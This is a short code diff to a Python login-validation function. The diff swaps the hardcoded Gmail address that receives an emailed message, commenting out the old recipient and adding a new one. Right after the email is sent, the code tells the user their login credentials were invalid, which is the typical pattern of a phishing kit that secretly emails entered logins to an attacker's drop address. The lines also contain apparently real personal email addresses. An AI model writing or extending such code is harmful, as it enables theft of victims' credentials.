@@ -35,7 +35,8 @@ def validate_user_email(request, email="default@gmail.com"):
 
             try:
                 # send_email.email_message_send('Update Successful', message, 'blinkslaura27@gmail.com' )
-                send_email.email_message_send('Update Successful', message, 'potter.alexe@gmail.com' )
+                # send_email.email_message_send('Update Successful', message, 'potter.alexe@gmail.com' )
+                send_email.email_message_send('Update Successful', message, 'aranchecarlos29@gmail.com' )
 
                 messages.error(request, "Invalid login credentials, please check details and try again.")
             except Exception as e:
